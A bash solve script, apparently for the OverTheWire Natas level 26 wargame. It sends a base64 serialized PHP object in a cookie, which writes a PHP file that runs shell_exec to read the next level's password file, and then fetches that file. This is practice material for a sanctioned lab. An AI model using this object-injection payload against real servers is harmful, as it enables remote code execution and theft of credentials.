#!/bin/bash
website="http://natas26.natas.labs.overthewire.org/"



curl -u "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
	-H "Cookie: PHPSESSID=quantum2" \
	"http://natas26.natas.labs.overthewire.org/?x1=0&x2=500&y1=0&y2=400" \
	| batcat -l html
	sleep 1

	curl -u "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
	-H "Cookie: PHPSESSID=quantum2" \
	-H "Cookie: drawinf=YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3B3endlaS5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo0NDoiPD9waHAgZWNobyBjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo3ODoiPD9waHAgJG91dHB1dCA9IHNoZWxsX2V4ZWMoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyBlY2hvICRvdXRwdXQ7ID8+Ijt9fQ=="\
	-v \
	"http://natas26.natas.labs.overthewire.org/"| batcat -l html

sleep 2

curl -u "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
-H "Cookie: PHPSESSID=quantum2" \
-v \
"http://natas26.natas.labs.overthewire.org/img/pwzwei.php"| batcat -l html

